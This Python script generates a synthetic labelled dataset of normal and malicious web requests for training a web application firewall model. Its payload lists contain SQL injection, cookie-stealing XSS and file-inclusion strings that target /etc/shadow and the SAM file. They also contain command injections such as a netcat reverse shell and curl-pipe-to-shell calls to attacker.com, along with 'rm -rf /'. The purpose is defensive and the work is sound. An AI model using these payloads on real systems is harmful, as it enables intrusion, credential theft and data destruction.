"""
Alternative: Generate comprehensive synthetic WAF dataset with realistic patterns.
This avoids permission issues with external datasets.
"""

import pandas as pd
import numpy as np
import random
from datetime import datetime, timedelta
import argparse
import os


# Attack patterns database
SQL_INJECTION_PATTERNS = [
    "' OR '1'='1", "' OR 1=1--", "admin'--", "1' UNION SELECT NULL--",
    "' OR 'x'='x", "1'; DROP TABLE users--", "admin' OR '1'='1'#",
    "' AND 1=1--", "1' AND '1'='1", "'; EXEC sp_msforeachtable--",
    "1' OR 1=1 UNION ALL SELECT 1,2,3--", "1' UNION SELECT username, password FROM users--"
]

XSS_PATTERNS = [
    "<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>", "javascript:alert(document.cookie)",
    "<iframe src='javascript:alert(1)'>", "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>", "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>", "<marquee onstart=alert(1)>",
    "<details open ontoggle=alert(1)>", "'\"><script>alert(String.fromCharCode(88,83,83))</script>"
]

LFI_PATTERNS = [
    "../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd", "../../../../../../etc/shadow",
    "..%2F..%2F..%2Fetc%2Fpasswd", "....\/....\/....\/etc/hosts",
    "/proc/self/environ", "../../apache/logs/access.log",
    "../../../var/log/apache2/error.log"
]

COMMAND_INJECTION_PATTERNS = [
    "; cat /etc/passwd", "| ls -la", "&& whoami", "`id`",
    "$(cat /etc/passwd)", "; nc -e /bin/sh attacker.com 4444",
    "| curl attacker.com/shell.sh | sh", "&& wget malicious.com/backdoor -O /tmp/bd",
    "; rm -rf /", "| ping -c 10 attacker.com"
]

PATH_TRAVERSAL_PATTERNS = [
    "../", "..\\", "..%2F", "..%5C", "....//", "....\\\\",
    "%2e%2e%2f", "%2e%2e\\", "..;/", "..%00/", "..%0d%0a/"
]


def generate_normal_sample():
    """Generate a normal, legitimate HTTP request."""
    normal_paths = [
        "/", "/home", "/about", "/contact", "/products", "/services",
        "/api/users", "/api/products", "/api/orders", "/api/data",
        "/dashboard", "/login", "/logout", "/profile", "/settings",
        "/docs", "/faq", "/pricing", "/features", "/blog", "/news"
    ]
    
    methods = ["GET", "POST", "PUT", "DELETE", "PATCH"]
    method_weights = [0.55, 0.30, 0.08, 0.05, 0.02]
    
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)",
        "PostmanRuntime/7.28.0", "curl/7.68.0", "Python-requests/2.26.0"
    ]
    
    return {
        'source_ip': f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}",
        'method': random.choices(methods, weights=method_weights)[0],
        'path': random.choice(normal_paths),
        'query_string': "" if random.random() > 0.3 else f"id={random.randint(1,100)}",
        'user_agent': random.choice(user_agents),
        'content_length': random.randint(0, 5000),
        'request_time_ms': random.randint(50, 500),
        'status_code': random.choices([200, 201, 204, 301, 302], [0.7, 0.1, 0.05, 0.1, 0.05])[0],
        'is_anomaly': 0,
        'attack_type': 'normal',
        'severity': 'none'
    }


def generate_sql_injection_sample():
    """Generate SQL injection attack sample."""
    paths = ["/api/users", "/api/products", "/search", "/login", "/api/data", "/api/query"]
    pattern = random.choice(SQL_INJECTION_PATTERNS)
    
    return {
        'source_ip': f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}",
        'method': random.choice(["GET", "POST"]),
        'path': random.choice(paths),
        'query_string': f"id={pattern}" if random.random() > 0.5 else f"search={pattern}",
        'user_agent': random.choice(["curl/7.68.0", "sqlmap/1.5", "Python-urllib/3.9", "Nikto"]),
        'content_length': random.randint(50, 500),
        'request_time_ms': random.randint(100, 2000),
        'status_code': random.choice([400, 403, 500]),
        'is_anomaly': 1,
        'attack_type': 'sql_injection',
        'severity': random.choice(['high', 'critical'])
    }


def generate_xss_sample():
    """Generate XSS attack sample."""
    paths = ["/comment", "/search", "/profile", "/api/submit", "/feedback", "/post"]
    pattern = random.choice(XSS_PATTERNS)
    
    return {
        'source_ip': f"172.{random.randint(16, 31)}.{random.randint(0, 255)}.{random.randint(1, 255)}",
        'method': random.choice(["GET", "POST"]),
        'path': random.choice(paths),
        'query_string': f"comment={pattern}" if random.random() > 0.5 else f"q={pattern}",
        'user_agent': random.choice(["Mozilla/5.0", "curl/7.68.0", "XSSer", "BeEF"]),
        'content_length': random.randint(100, 1000),
        'request_time_ms': random.randint(80, 800),
        'status_code': random.choice([400, 403]),
        'is_anomaly': 1,
        'attack_type': 'xss',
        'severity': random.choice(['medium', 'high'])
    }


def generate_lfi_sample():
    """Generate LFI attack sample."""
    paths = ["/download", "/file", "/api/get", "/view", "/read"]
    pattern = random.choice(LFI_PATTERNS)
    
    return {
        'source_ip': f"203.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}",
        'method': "GET",
        'path': random.choice(paths),
        'query_string': f"file={pattern}",
        'user_agent': random.choice(["curl/7.68.0", "Mozilla/5.0", "Nikto", "DirBuster"]),
        'content_length': random.randint(20, 200),
        'request_time_ms': random.randint(100, 1500),
        'status_code': random.choice([403, 404, 500]),
        'is_anomaly': 1,
        'attack_type': 'lfi',
        'severity': 'high'
    }


def generate_command_injection_sample():
    """Generate command injection attack sample."""
    paths = ["/api/exec", "/run", "/system", "/api/command", "/execute"]
    pattern = random.choice(COMMAND_INJECTION_PATTERNS)
    
    return {
        'source_ip': f"45.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}",
        'method': random.choice(["POST", "GET"]),
        'path': random.choice(paths),
        'query_string': f"cmd={pattern}" if random.random() > 0.5 else f"exec={pattern}",
        'user_agent': random.choice(["curl/7.68.0", "Python-requests/2.26.0", "Metasploit"]),
        'content_length': random.randint(50, 400),
        'request_time_ms': random.randint(200, 3000),
        'status_code': random.choice([403, 500]),
        'is_anomaly': 1,
        'attack_type': 'command_injection',
        'severity': 'critical'
    }


def generate_path_traversal_sample():
    """Generate path traversal attack sample."""
    paths = ["/download", "/file", "/view", "/read", "/api/file"]
    pattern = random.choice(PATH_TRAVERSAL_PATTERNS)
    base_file = random.choice(["config.php", "web.config", "database.yml", ".env", "secrets.json"])
    
    return {
        'source_ip': f"185.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}",
        'method': "GET",
        'path': random.choice(paths),
        'query_string': f"file={pattern}{base_file}",
        'user_agent': random.choice(["curl/7.68.0", "Mozilla/5.0", "Nikto"]),
        'content_length': random.randint(30, 300),
        'request_time_ms': random.randint(100, 1000),
        'status_code': random.choice([403, 404]),
        'is_anomaly': 1,
        'attack_type': 'path_traversal',
        'severity': 'high'
    }


def generate_dataset(num_normal, num_anomalous, output_file):
    """Generate complete dataset with normal and anomalous samples."""
    print(f"Generating comprehensive WAF dataset...")
    print(f"Normal samples: {num_normal}")
    print(f"Anomalous samples: {num_anomalous}")
    
    samples = []
    
    # Generate normal samples
    print("\nGenerating normal traffic...")
    for i in range(num_normal):
        samples.append(generate_normal_sample())
        if (i + 1) % 1000 == 0:
            print(f"  Generated {i+1}/{num_normal} normal samples")
    
    # Generate attack samples (distributed across types)
    print("\nGenerating attack traffic...")
    attack_generators = [
        (generate_sql_injection_sample, 0.30),  # 30% SQL injection
        (generate_xss_sample, 0.25),  # 25% XSS
        (generate_lfi_sample, 0.20),  # 20% LFI
        (generate_command_injection_sample, 0.15),  # 15% Command injection
        (generate_path_traversal_sample, 0.10),  # 10% Path traversal
    ]
    
    for generator, ratio in attack_generators:
        count = int(num_anomalous * ratio)
        attack_name = generator.__name__.replace("generate_", "").replace("_sample", "")
        print(f"  Generating {count} {attack_name} samples...")
        for _ in range(count):
            samples.append(generator())
    
    # Shuffle all samples
    random.shuffle(samples)
    
    # Create DataFrame
    df = pd.DataFrame(samples)
    
    # Add timestamps
    base_time = datetime.now() - timedelta(days=30)
    df['timestamp'] = [base_time + timedelta(seconds=i*random.randint(1, 300)) for i in range(len(df))]
    
    # Save to CSV
    os.makedirs(os.path.dirname(output_file), exist_ok=True)
    df.to_csv(output_file, index=False)
    
    print(f"\n✅ Dataset saved to: {output_file}")
    print(f"\nDataset Statistics:")
    print(f"  Total samples: {len(df)}")
    print(f"  Normal: {len(df[df['is_anomaly'] == 0])} ({len(df[df['is_anomaly'] == 0])/len(df)*100:.1f}%)")
    print(f"  Anomalous: {len(df[df['is_anomaly'] == 1])} ({len(df[df['is_anomaly'] == 1])/len(df)*100:.1f}%)")
    print(f"\nAttack Type Distribution:")
    print(df[df['is_anomaly'] == 1]['attack_type'].value_counts())


def main():
    parser = argparse.ArgumentParser(description='Generate comprehensive WAF dataset')
    parser.add_argument('--normal', type=int, default=10000, help='Number of normal samples')
    parser.add_argument('--anomalous', type=int, default=2000, help='Number of anomalous samples')
    parser.add_argument('--output', default='data/training/waf_dataset.csv', help='Output CSV file')
    
    args = parser.parse_args()
    generate_dataset(args.normal, args.anomalous, args.output)
    
    print(f"\n🎯 Next steps:")
    print(f"1. Train models: python src/ml/train.py --data {args.output}")
    print(f"2. Start API: python src/main.py")
    print(f"3. Start dashboard: cd dashboard && npm run dev")


if __name__ == '__main__':
    main()
